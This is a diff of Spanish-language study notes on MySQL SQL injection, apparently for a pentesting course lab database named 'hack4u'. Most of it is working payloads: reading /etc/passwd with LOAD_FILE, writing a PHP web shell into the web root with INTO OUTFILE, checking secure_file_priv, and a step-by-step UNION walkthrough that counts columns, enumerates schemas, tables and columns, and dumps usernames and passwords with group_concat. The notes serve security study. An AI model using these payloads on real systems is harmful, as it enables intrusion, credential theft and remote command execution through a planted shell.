@@ -148,6 +148,9 @@ cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 
 **File Write (Escritura de Archivos):**
 ```SQL
+-- Verificar permiso
+foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
 -- Prueba de escritura simple
 select 'file written successfully!' into outfile '/var/www/html/proof.txt'
 
@@ -159,6 +162,13 @@ cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.
 ***
 
 ## Overview
+
+
+
+
+
+
+
 
 
 
@@ -174,3 +184,74 @@ cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.
 |`#` (Almohadilla)|`%23`|Operador de comentario en [[MySQL]]; trunca el resto de la consulta original.|
 |`;` (Punto y coma)|`%3B`|Terminador de sentencias; crucial para habilitar inyecciones apiladas (Stacked Queries).|
 |`)` (Paréntesis de cierre)|`%29`|Equilibrio de sintaxis; permite cerrar funciones o subconsultas previas al payload.|
+
+
+### 1. Obtener un nombre de usuario específico
+```sql
+select username from users where id = '3';
+```
+Esta consulta selecciona el nombre de usuario del registro en la tabla `users` donde el `id` es igual a `3`.
+
+### 2. Intentar ordenar por columnas desconocidas
+```sql
+select username from users where id = '3' order by 3;
+select username from users where id = '3' order by 2;
+select username from users where id = '3' order by 1;
+```
+Estas consultas intentan ordenar los resultados por diferentes números de columna. Este es un método para identificar cuántas columnas están siendo seleccionadas en la consulta original. Si ordenas por una columna que no existe, obtendrás un error, lo cual te dice cuántas columnas hay realmente en la selección.
+
+### 3. Usar `UNION` para añadir resultados adicionales
+```sql
+select username from users where id = '3' union select 1;
+```
+Aquí, intentas agregar una fila adicional al conjunto de resultados con un valor estático `1`. Esto es un paso inicial para verificar si la inyección SQL con `UNION` es posible. Si la consulta se ejecuta sin errores, significa que puedes combinar resultados adicionales.
+
+### 4. Probar `UNION` con un ID que no existe
+```sql
+select username from users where id = '332131' union select 1;
+```
+Esta consulta es similar a la anterior, pero ahora estás seleccionando un ID que probablemente no existe (`332131`). Si la consulta aún devuelve resultados, puedes verificar que `UNION` está funcionando correctamente para agregar resultados arbitrarios.
+
+### 5. Obtener nombres de bases de datos
+```sql
+select username as BASES_DE_DATOS from users where id = '332131' union select schema_name from information_schema.schemata;
+```
+En esta consulta, usas `UNION` para obtener nombres de todas las bases de datos en el servidor. `information_schema.schemata` contiene información sobre todas las bases de datos disponibles. Renombras la columna resultante como `BASES_DE_DATOS` para claridad. 
+**En la web para ver todo puedo usar group_concat**
+```sql
+select username as BASES_DE_DATOS from users where id = '332131' union select group_concat(schema_name) from information_schema.schemata-- -';
+```
+
+### 6. Obtener nombres de tablas en una base de datos específica
+```sql
+select username as TABLAS_DE_HACK4U from users where id = '332131' union select table_name from information_schema.tables where table_schema = 'hack4u';
+```
+Aquí, estás obteniendo los nombres de todas las tablas dentro de la base de datos `hack4u`. `information_schema.tables` contiene información sobre todas las tablas. Filtras los resultados para la base de datos específica `hack4u` y renombras la columna resultante como `TABLAS_DE_HACK4U`.
+
+### 7. Obtener nombres de columnas en una tabla específica
+```sql
+select username as COLUMNAS_DE_HACK4U from users where id = '332131' union select column_name from information_schema.columns where table_schema = 'hack4u' and table_name = 'users';
+```
+En esta consulta, estás obteniendo los nombres de todas las columnas dentro de la tabla `users` de la base de datos `hack4u`. `information_schema.columns` contiene información sobre todas las columnas. Filtras los resultados para la tabla y base de datos específica y renombras la columna resultante como `COLUMNAS_DE_HACK4U`.
+
+### 8. Obtener todos los nombres de usuario
+```sql
+select username as USUARIOS from users where id = '332131' union select username from users;
+```
+Ahora, obtienes todos los nombres de usuario en la tabla `users`. Renombras la columna resultante como `USUARIOS` para claridad.
+
+### 9. Obtener todas las contraseñas
+```sql
+select username as CONTRASEÑAS from users where id = '332131' union select password from users;
+```
+Finalmente, obtienes todas las contraseñas de la tabla `users`. Renombras la columna resultante como `CONTRASEÑAS` para claridad.
+(si no estuviera conectado con la base de datos `hacku4` tendría que poner `hack4u.users`para que funcione)
+
+### 9.1 Agregar `group_concat` para ver usuario y contraseña al lado
+```sql
+select username from users where id = '332131' union select group_concat(username,':',password) from users;
+```
+En algunos casos el campo `':'` puede dar problemas en la url por las comillas, en tal caso podría ser recomendable ponerlos en hexadecimal (`0x3a`).
+```sql
+select username from users where id = '332131' union select group_concat(username,0x3a,password) from users;
+```
